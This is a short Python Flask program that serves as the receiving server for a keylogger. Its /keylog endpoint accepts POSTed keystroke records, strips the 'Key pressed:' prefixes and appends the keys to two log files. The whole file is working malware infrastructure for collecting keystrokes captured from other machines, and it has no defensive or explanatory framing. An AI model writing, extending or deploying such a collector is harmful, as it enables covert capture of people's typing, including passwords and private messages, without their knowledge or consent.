from flask import Flask, request

app = Flask(__name__)

# Primary log file to store full information
primary_log_file = "server_keylog.txt"

# Secondary log file to store only keys
keys_only_file = "keys_only.txt"


# Endpoint to receive keylogs
@app.route('/keylog', methods=['POST'])
def keylog():
    # Get the keystroke data from the POST request
    key_data = request.form.get('key')

    if key_data:
        # 1. Store full information in the primary log file
        with open(primary_log_file, "a") as f:
            f.write(f"{key_data}\n")

        # 2. Extract only the key part and store in the secondary log file
        # Extract the part after "Key pressed: " or "Special key pressed: "
        if "Key pressed:" in key_data:
            key_entry = key_data.split("Key pressed: ")[1]
        elif "Special key pressed:" in key_data:
            key_entry = key_data.split("Special key pressed: ")[1]
        else:
            key_entry = key_data  # Fallback in case of an unexpected format

        # Save just the key entry to the keys-only file
        with open(keys_only_file, "a") as f:
            f.write(f"{key_entry}\n")

    return "Logged", 200


if __name__ == "__main__":
    app.run(host='127.0.0.1', port=80)  # Expose on port 80 for HTTP access
